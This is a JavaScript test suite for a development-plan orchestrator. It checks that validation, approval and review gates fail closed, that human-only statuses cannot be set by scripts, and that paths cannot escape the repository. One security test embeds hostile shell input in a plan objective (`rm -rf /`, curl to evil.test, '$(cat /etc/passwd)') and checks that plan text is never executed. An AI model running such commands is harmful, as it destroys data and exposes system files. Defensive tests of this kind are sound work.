/**
 * Advisacor Development Orchestrator V1 — fail-closed test suite.
 * Uses temporary fixtures under tests/orchestrator/_tmp/ (gitignored).
 * Does not modify docs/plans production plans.
 */

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(__dirname, "..", "..");
const TMP_ROOT = path.join(__dirname, "_tmp");

const lib = require(path.join(REPO_ROOT, "scripts/orchestrator/lib.js"));

function buildPlan({
  planId = "TEST-PLAN-001",
  status = "DRAFT",
  objective = "Verify orchestrator fail-closed behavior with a harmless fixture plan.",
  acceptance = ["- Criterion one is met", "- Criterion two is met"],
  includeSecurity = true,
  includeHumanGate = true,
  omitSections = [],
} = {}) {
  const sections = {
    "Plan ID": `Plan ID: ${planId}`,
    Title: "Title: Orchestrator fixture plan",
    Status: `STATUS: ${status}`,
    Objective: objective,
    Scope: "- Fixture files under tests/orchestrator/_tmp only",
    "Out of Scope": "- Production systems\n- Real docs/plans edits",
    "Security Requirements": includeSecurity
      ? "- No secrets; path-confined fixtures only"
      : "",
    "Tenant Isolation Requirements": "- N/A for fixture",
    "Acceptance Criteria": acceptance.join("\n"),
    "Required Tests": "- npm run orchestrator",
    "Validation Commands": "- node scripts/orchestrator/validate-plan.js <plan>",
    "Prohibited Changes": "- app/, lib/, supabase/, production",
    "Rollback Considerations": "- Delete temporary fixture directory",
    "Human Approval Gate": includeHumanGate
      ? "| Field | Value |\n| Author | test |\n| Approved by | (pending) |"
      : "",
  };

  const lines = [`# ${planId} fixture\n`];
  for (const [name, body] of Object.entries(sections)) {
    if (omitSections.includes(name)) continue;
    lines.push(`## ${name}\n`);
    lines.push(`${body}\n`);
  }
  return lines.join("\n");
}

function writeFixture(dir, name, content) {
  fs.mkdirSync(dir, { recursive: true });
  const filePath = path.join(dir, name);
  fs.writeFileSync(filePath, content, "utf8");
  return filePath;
}

function writeCompanion(planPath, data) {
  const statusPath = lib.getStatusJsonPath(planPath);
  fs.writeFileSync(statusPath, `${JSON.stringify(data, null, 2)}\n`, "utf8");
  return statusPath;
}

function runCli(scriptName, args = []) {
  const script = path.join(REPO_ROOT, "scripts/orchestrator", scriptName);
  return spawnSync(process.execPath, [script, ...args], {
    cwd: REPO_ROOT,
    encoding: "utf8",
    env: { ...process.env, NO_COLOR: "1" },
  });
}

function rel(planPath) {
  return path.relative(REPO_ROOT, planPath).split(path.sep).join("/");
}

describe("orchestrator V1 fail-closed suite", () => {
  let fixtureDir;

  beforeEach(() => {
    fs.mkdirSync(TMP_ROOT, { recursive: true });
    fixtureDir = fs.mkdtempSync(path.join(TMP_ROOT, "case-"));
  });

  afterEach(() => {
    if (fixtureDir && fs.existsSync(fixtureDir)) {
      fs.rmSync(fixtureDir, { recursive: true, force: true });
    }
  });

  describe("plan validation", () => {
    it("PASS: valid DRAFT plan", () => {
      const planPath = writeFixture(fixtureDir, "plan.md", buildPlan({ status: "DRAFT" }));
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(true);
      expect(result.status).toBe("DRAFT");
    });

    it("PASS: valid APPROVED_FOR_IMPLEMENTATION plan", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "APPROVED_FOR_IMPLEMENTATION" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        planPath: rel(planPath),
        status: "APPROVED_FOR_IMPLEMENTATION",
      });
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(true);
      expect(result.status).toBe("APPROVED_FOR_IMPLEMENTATION");
    });

    it("FAIL: missing PLAN_ID", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ omitSections: ["Plan ID"] }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /Plan ID/i.test(e))).toBe(true);
    });

    it("FAIL: missing STATUS", () => {
      let md = buildPlan();
      md = md.replace(/^STATUS:.*$/m, "");
      const planPath = writeFixture(fixtureDir, "plan.md", md);
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /STATUS/i.test(e))).toBe(true);
    });

    it("FAIL: invalid STATUS", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "IN_IMPLEMENTATION" }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /Invalid STATUS/i.test(e))).toBe(true);
    });

    it("FAIL: missing OBJECTIVE", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ omitSections: ["Objective"] }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /Objective/i.test(e))).toBe(true);
    });

    it("FAIL: missing ACCEPTANCE_CRITERIA section", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ omitSections: ["Acceptance Criteria"] }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /Acceptance Criteria/i.test(e))).toBe(true);
    });

    it("FAIL: empty acceptance criteria", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ acceptance: ["(none yet)"] }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /Acceptance Criteria/i.test(e))).toBe(true);
    });

    it("FAIL: missing security / human gate bodies", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({
          omitSections: ["Security Requirements", "Human Approval Gate"],
        }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.some((e) => /Security Requirements/i.test(e))).toBe(
        true,
      );
      expect(result.errors.some((e) => /Human Approval Gate/i.test(e))).toBe(
        true,
      );
    });

    it("FAIL: empty security / human gate section bodies", () => {
      const planPath = writeFixture(
        fixtureDir,
        "empty-gates.md",
        `# Empty gates fixture

## Plan ID

Plan ID: TEST-PLAN-001

## Title

Title: Empty gate bodies

## Status

STATUS: DRAFT

## Objective

Verify empty security and human gate bodies fail validation.

## Scope

- Fixture only

## Out of Scope

- Production

## Security Requirements

## Tenant Isolation Requirements

- N/A for fixture

## Acceptance Criteria

- Criterion one is met

## Required Tests

- npm run orchestrator

## Validation Commands

- node scripts/orchestrator/validate-plan.js

## Prohibited Changes

- app/

## Rollback Considerations

- Delete fixture

## Human Approval Gate

`,
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(
        result.errors.some((e) => /Security Requirements/i.test(e)),
      ).toBe(true);
      expect(
        result.errors.some((e) => /Human Approval Gate/i.test(e)),
      ).toBe(true);
    });

    it("FAIL: malformed plan format (empty file)", () => {
      const planPath = writeFixture(fixtureDir, "plan.md", "");
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe("approval gate", () => {
    const nonApproved = [
      "DRAFT",
      "READY_FOR_REVIEW",
      "IN_PROGRESS",
      "IMPLEMENTATION_COMPLETE",
      "REVIEW_FAILED",
      "REVIEW_PASSED",
      "READY_FOR_HUMAN_APPROVAL",
      "COMPLETED",
      "BLOCKED",
    ];

    it("PASS: APPROVED_FOR_IMPLEMENTATION", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "APPROVED_FOR_IMPLEMENTATION" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "APPROVED_FOR_IMPLEMENTATION",
      });
      const r = runCli("confirm-approval.js", [rel(planPath)]);
      expect(r.status).toBe(0);
    });

    for (const status of nonApproved) {
      it(`FAIL: ${status}`, () => {
        const planPath = writeFixture(
          fixtureDir,
          "plan.md",
          buildPlan({ status }),
        );
        const companion = { planId: "TEST-PLAN-001", status };
        if (
          [
            "IMPLEMENTATION_COMPLETE",
            "REVIEW_FAILED",
            "REVIEW_PASSED",
            "READY_FOR_HUMAN_APPROVAL",
          ].includes(status)
        ) {
          companion.implementation = {
            results: { planId: "TEST-PLAN-001", success: true },
          };
        }
        if (status === "REVIEW_PASSED" || status === "READY_FOR_HUMAN_APPROVAL") {
          companion.review = { verdict: "PASS" };
        }
        if (status === "REVIEW_FAILED") {
          companion.review = { verdict: "NEEDS_CHANGES" };
        }
        writeCompanion(planPath, companion);
        const r = runCli("confirm-approval.js", [rel(planPath)]);
        expect(r.status).not.toBe(0);
      });
    }

    it("FAIL: missing status", () => {
      let md = buildPlan();
      md = md.replace(/^STATUS:.*$/m, "");
      const planPath = writeFixture(fixtureDir, "plan.md", md);
      const r = runCli("confirm-approval.js", [rel(planPath)]);
      expect(r.status).not.toBe(0);
    });

    it("FAIL: malformed status", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "NOT_A_REAL_STATUS" }),
      );
      const r = runCli("confirm-approval.js", [rel(planPath)]);
      expect(r.status).not.toBe(0);
    });
  });

  describe("implementation recording", () => {
    function approvedInProgress() {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "IN_PROGRESS" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "IN_PROGRESS",
        phase: "implementation",
      });
      return planPath;
    }

    it("PASS: valid implementation result for approved/in-progress plan", () => {
      const planPath = approvedInProgress();
      const results = JSON.stringify({
        planId: "TEST-PLAN-001",
        lint: "pass",
        typecheck: "pass",
        tests: "pass",
        build: "pass",
        success: true,
      });
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        results,
      ]);
      expect(r.status).toBe(0);
      const companion = lib.readStatusJson(planPath);
      expect(companion.status).toBe("IMPLEMENTATION_COMPLETE");
    });

    it("FAIL: implementation recorded against non-approved (DRAFT) plan", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "DRAFT" }),
      );
      writeCompanion(planPath, { planId: "TEST-PLAN-001", status: "DRAFT" });
      const results = JSON.stringify({
        planId: "TEST-PLAN-001",
        lint: "pass",
        success: true,
      });
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        results,
      ]);
      expect(r.status).not.toBe(0);
    });

    it("FAIL: malformed result JSON", () => {
      const planPath = approvedInProgress();
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        "{not-json",
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/Malformed/i);
    });

    it("FAIL: missing PLAN_ID in results", () => {
      const planPath = approvedInProgress();
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        JSON.stringify({ lint: "pass", success: true }),
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/planId|PLAN_ID/i);
    });

    it("FAIL: mismatched PLAN_ID", () => {
      const planPath = approvedInProgress();
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        JSON.stringify({ planId: "OTHER-PLAN", lint: "pass", success: true }),
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/mismatch/i);
    });

    it("FAIL: false success when required validation failed", () => {
      const planPath = approvedInProgress();
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        JSON.stringify({
          planId: "TEST-PLAN-001",
          lint: "fail",
          success: true,
        }),
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/lint failed|validation failed/i);
    });
  });

  describe("review gate", () => {
    function implComplete() {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "IMPLEMENTATION_COMPLETE" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "IMPLEMENTATION_COMPLETE",
        implementation: {
          completedAt: new Date().toISOString(),
          results: { planId: "TEST-PLAN-001", success: true },
        },
      });
      return planPath;
    }

    it("PASS: legitimate PASS review with advance", () => {
      const planPath = implComplete();
      const r = runCli("record-review.js", [
        rel(planPath),
        "--verdict",
        "PASS",
        "--advance",
      ]);
      expect(r.status).toBe(0);
      const companion = lib.readStatusJson(planPath);
      expect(companion.status).toBe("READY_FOR_HUMAN_APPROVAL");
      expect(companion.review.verdict).toBe("PASS");
    });

    it("FAIL: NEEDS_CHANGES cannot advance", () => {
      const planPath = implComplete();
      const r = runCli("record-review.js", [
        rel(planPath),
        "--verdict",
        "NEEDS_CHANGES",
        "--advance",
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/Advance blocked|Unsafe transition/i);
    });

    it("FAIL: BLOCKED cannot advance", () => {
      const planPath = implComplete();
      const r = runCli("record-review.js", [
        rel(planPath),
        "--verdict",
        "BLOCKED",
        "--advance",
      ]);
      expect(r.status).not.toBe(0);
    });

    it("FAIL: missing reviewer result cannot advance", () => {
      const planPath = implComplete();
      const r = runCli("record-review.js", [rel(planPath), "--advance"]);
      expect(r.status).not.toBe(0);
    });

    it("FAIL: malformed reviewer result cannot advance", () => {
      const planPath = implComplete();
      const r = runCli("record-review.js", [
        rel(planPath),
        "--verdict",
        "YEET",
        "--advance",
      ]);
      expect(r.status).not.toBe(0);
    });

    it("FAIL: PASS with mismatched PLAN_ID cannot advance", () => {
      const planPath = implComplete();
      const r = runCli("record-review.js", [
        rel(planPath),
        "--verdict",
        "PASS",
        "--advance",
        "--plan-id",
        "WRONG-ID",
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/PLAN_ID mismatch/i);
    });
  });

  describe("state machine", () => {
    it("DRAFT → IN_PROGRESS = FAIL", () => {
      expect(() =>
        lib.assertTransitionAllowed("DRAFT", "IN_PROGRESS"),
      ).toThrow(/Invalid state transition/);
    });

    it("DRAFT → READY_FOR_HUMAN_APPROVAL = FAIL", () => {
      expect(() =>
        lib.assertTransitionAllowed("DRAFT", "READY_FOR_HUMAN_APPROVAL"),
      ).toThrow(/Invalid state transition/);
    });

    it("APPROVED_FOR_IMPLEMENTATION → REVIEW_PASSED = FAIL", () => {
      expect(() =>
        lib.assertTransitionAllowed(
          "APPROVED_FOR_IMPLEMENTATION",
          "REVIEW_PASSED",
        ),
      ).toThrow(/Invalid state transition/);
    });

    it("IMPLEMENTATION_COMPLETE → READY_FOR_HUMAN_APPROVAL without REVIEW_PASSED = FAIL", () => {
      expect(() =>
        lib.assertTransitionAllowed(
          "IMPLEMENTATION_COMPLETE",
          "READY_FOR_HUMAN_APPROVAL",
        ),
      ).toThrow(/Invalid state transition/);
    });

    it("REVIEW_FAILED → READY_FOR_HUMAN_APPROVAL = FAIL", () => {
      expect(() =>
        lib.assertTransitionAllowed(
          "REVIEW_FAILED",
          "READY_FOR_HUMAN_APPROVAL",
        ),
      ).toThrow(/Invalid state transition/);
    });

    it("REVIEW_PASSED → READY_FOR_HUMAN_APPROVAL = PASS", () => {
      expect(() =>
        lib.assertTransitionAllowed(
          "REVIEW_PASSED",
          "READY_FOR_HUMAN_APPROVAL",
        ),
      ).not.toThrow();
    });
  });

  describe("human gate", () => {
    it("scripts refuse to write COMPLETED", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "READY_FOR_HUMAN_APPROVAL" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "READY_FOR_HUMAN_APPROVAL",
        implementation: { results: { success: true } },
        review: { verdict: "PASS" },
      });
      expect(() =>
        lib.writeStatusJson(
          planPath,
          {
            planId: "TEST-PLAN-001",
            status: "COMPLETED",
          },
          { fromStatus: "READY_FOR_HUMAN_APPROVAL", syncMarkdown: false },
        ),
      ).toThrow(/human-only|Invalid state transition/i);
    });

    it("scripts refuse to write APPROVED_FOR_IMPLEMENTATION", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "DRAFT" }),
      );
      expect(() =>
        lib.writeStatusJson(
          planPath,
          { planId: "TEST-PLAN-001", status: "APPROVED_FOR_IMPLEMENTATION" },
          { fromStatus: "DRAFT", syncMarkdown: false },
        ),
      ).toThrow(/human-only/i);
    });

    it("human-summary never grants merge/deploy and never sets COMPLETED", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "READY_FOR_HUMAN_APPROVAL" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "READY_FOR_HUMAN_APPROVAL",
        implementation: { results: { success: true } },
        review: { verdict: "PASS" },
      });
      const r = runCli("human-summary.js", [rel(planPath)]);
      expect(r.status).toBe(0);
      const summary = JSON.parse(r.stdout);
      expect(summary.merge).toBe(false);
      expect(summary.deploy).toBe(false);
      expect(summary.canAutonomouslyComplete).toBe(false);
      expect(summary.currentStatus).not.toBe("COMPLETED");
      const after = lib.readStatusJson(planPath);
      expect(after.status).toBe("READY_FOR_HUMAN_APPROVAL");
    });

    it("prepare-implementation payload has merge/deploy false", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "APPROVED_FOR_IMPLEMENTATION" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "APPROVED_FOR_IMPLEMENTATION",
      });
      const r = runCli("prepare-implementation.js", [rel(planPath)]);
      expect(r.status).toBe(0);
      const payload = JSON.parse(r.stdout);
      expect(payload.merge).toBe(false);
      expect(payload.deploy).toBe(false);
    });
  });

  describe("fail-closed behavior", () => {
    it("missing file", () => {
      const r = runCli("validate-plan.js", [
        "tests/orchestrator/_tmp/does-not-exist.md",
      ]);
      expect(r.status).not.toBe(0);
    });

    it("malformed plan", () => {
      const planPath = writeFixture(fixtureDir, "plan.md", "not a plan");
      const r = runCli("validate-plan.js", [rel(planPath)]);
      expect(r.status).not.toBe(0);
    });

    it("malformed companion JSON", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "DRAFT" }),
      );
      fs.writeFileSync(lib.getStatusJsonPath(planPath), "{bad", "utf8");
      const r = runCli("validate-plan.js", [rel(planPath)]);
      expect(r.status).not.toBe(0);
      expect(r.stderr + r.stdout).toMatch(/Malformed|malformed/i);
    });

    it("unexpected CLI arguments", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "IN_PROGRESS" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "IN_PROGRESS",
      });
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        JSON.stringify({ planId: "TEST-PLAN-001", success: true }),
        "--explode",
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/Unexpected argument/i);
    });

    it("invalid paths (escape repo)", () => {
      expect(() =>
        lib.resolveSafeRepoPath("../../../etc/passwd"),
      ).toThrow(/escapes repository root/i);

      const outside = path.join(os.tmpdir(), "orch-escape-test.md");
      const r = runCli("validate-plan.js", [outside]);
      expect(r.status).not.toBe(0);
    });

    it("corrupt status companion fails closed on integrity", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "READY_FOR_HUMAN_APPROVAL" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "READY_FOR_HUMAN_APPROVAL",
        // missing implementation + PASS review
      });
      const r = runCli("validate-plan.js", [rel(planPath)]);
      expect(r.status).not.toBe(0);
      expect(r.stderr + r.stdout).toMatch(/integrity|implementation evidence/i);
    });

    it("hand-edited READY_FOR_HUMAN_APPROVAL without PASS review is rejected", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "READY_FOR_HUMAN_APPROVAL" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "READY_FOR_HUMAN_APPROVAL",
        implementation: { results: { success: true } },
        review: { verdict: "NEEDS_CHANGES" },
      });
      expect(() =>
        lib.resolveEffectiveStatus(
          planPath,
          fs.readFileSync(planPath, "utf8"),
        ),
      ).toThrow(/review\.verdict PASS/i);
    });

    it("missing CLI plan argument fails closed", () => {
      const r = runCli("confirm-approval.js", []);
      expect(r.status).not.toBe(0);
    });

    it("production authority flags in results are rejected", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({ status: "IN_PROGRESS" }),
      );
      writeCompanion(planPath, {
        planId: "TEST-PLAN-001",
        status: "IN_PROGRESS",
      });
      const r = runCli("record-implementation.js", [
        rel(planPath),
        "--results",
        JSON.stringify({
          planId: "TEST-PLAN-001",
          success: true,
          deploy: true,
        }),
      ]);
      expect(r.status).not.toBe(0);
      expect(r.stderr).toMatch(/Production authority|deploy/i);
    });
  });

  describe("security: no shell from plan / no secrets", () => {
    it("plan content with shell metacharacters is not executed", () => {
      const planPath = writeFixture(
        fixtureDir,
        "plan.md",
        buildPlan({
          objective:
            'Verify no shell; ignore `rm -rf /` && curl http://evil.test "$(cat /etc/passwd)"',
        }),
      );
      const result = lib.validatePlanStructure(planPath);
      expect(result.ok).toBe(true);
      // ensure we never spawn a shell with plan text
      const r = runCli("validate-plan.js", [rel(planPath)]);
      expect(r.status).toBe(0);
    });

    it("lib exports do not include shell helpers", () => {
      expect(lib.exec).toBeUndefined();
      expect(lib.spawn).toBeUndefined();
      expect(lib.execSync).toBeUndefined();
    });
  });
});
